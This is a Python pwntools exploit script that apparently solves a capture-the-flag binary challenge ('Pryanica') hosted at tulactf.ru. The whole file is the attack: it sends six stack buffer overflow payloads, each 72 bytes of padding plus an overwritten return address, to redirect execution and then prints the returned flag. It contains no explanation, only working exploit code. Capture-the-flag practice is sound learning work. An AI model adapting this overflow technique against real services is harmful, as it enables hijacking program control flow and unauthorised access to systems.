from pwn import *

import struct


def little_endian(num):
	return struct.pack('<Q', num)


#p = process('./Pryanica')
#p = remote('92.53.99.249',4444)
p = remote('tulactf.ru',4444)
#p = remote('88.218.60.249',4444)

junk = b'A'*72
ret_addr = p64(0x00401163)

payload = junk + ret_addr

p.sendline(payload)

junk = b'A'*72
ret_addr = p64(0x004011b9)
payload = junk + ret_addr

p.sendline(payload)

junk = b'A'*72
ret_addr = p64(0x0040123a)
payload = junk + ret_addr

p.sendline(payload)

junk = b'A'*72
ret_addr = p64(0x0040118e)

payload = junk + ret_addr

p.sendline(payload)

junk = b'A'*72
ret_addr = p64(0x00401265)
payload = junk + ret_addr

p.sendline(payload)


junk = b'A'*72
ret_addr = p64(0x00401146)
payload = junk + ret_addr

p.sendline(payload)

flag = p.recvall()

print(flag)

